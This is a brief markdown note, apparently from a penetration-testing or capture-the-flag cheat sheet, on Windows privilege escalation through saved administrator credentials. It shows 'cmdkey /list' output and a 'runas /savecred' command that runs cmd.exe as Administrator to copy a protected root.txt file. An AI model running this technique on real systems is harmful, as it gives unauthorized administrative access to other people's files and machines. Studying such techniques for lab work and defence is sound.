# <span style="color:#FF5555">Runas-Savdcreds</span>
## <span style="color:#8BE9FD">Methodology</span>
We can check if there are any pre-existing credentials of the administrator on the system. We can abuse this by using the loaded creds for privilege escalation. In the below example, I will demonstrate how to read files through the saved creds.

## <span style="color:#8BE9FD">Detection</span>
1. winpeas 
2. Checking for existence

```console
$ cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

## <span style="color:#8BE9FD">Exploitation</span>
1. Reading root flag

```console
C:\Temp> C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE c:\Users\Administrator\Desktop\root.txt > C:\Users\security\root1.txt"
```

